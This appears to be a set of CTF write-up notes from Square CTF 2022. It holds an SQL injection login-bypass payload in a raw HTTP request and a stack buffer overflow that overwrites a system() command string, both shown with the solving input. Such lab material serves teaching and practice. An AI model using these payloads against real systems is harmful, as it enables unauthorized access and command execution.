## EZ pwn 2

Required reading:
- intro to x86 https://www.cs.virginia.edu/~evans/cs216/guides/x86.html
- x86-64 stack layout https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64
- Stack Canaries https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/
- stack based buffer overflows https://en.wikipedia.org/wiki/Stack_buffer_overflow
- ASLR https://en.wikipedia.org/wiki/Address_space_layout_randomization
Optional Reading:
- pwntools https://docs.pwntools.com/en/stable/intro.html#making-connections











## its right there

Android, RE, 100










## Alex Hanlon Has The Flag!

Web, 50


POST / HTTP/1.1
Host: chals.2022.squarectf.com:4102
Content-Length: 62
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://chals.2022.squarectf.com:4102
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://chals.2022.squarectf.com:4102/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

username=alan&password=%25'+or+1=1+and+username+!=+'admin'--+-


## EZ pwn 1

pwn, 50

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int main()
{
    char command[16];
    char way_too_small_input_buf[8];
    strcpy(command, "ls");

    puts("Hi! would you like me to ls the current directory?");
    read(0, way_too_small_input_buf, 24);
    if (!strcmp(way_too_small_input_buf, "no\n")) {
        puts("Oh, ok :(");
        exit(0);
    }

    puts("Ok, here ya go!\n");
    system(command);

}
```

$ nc chals.2022.squarectf.com 4100
Hi! would you like me to ls the current directory?
aaaaaaaacat *the*/*.txt
Ok, here ya go!

flag{congrats_youve_exploited_a_memory_corruption_vulnerability}
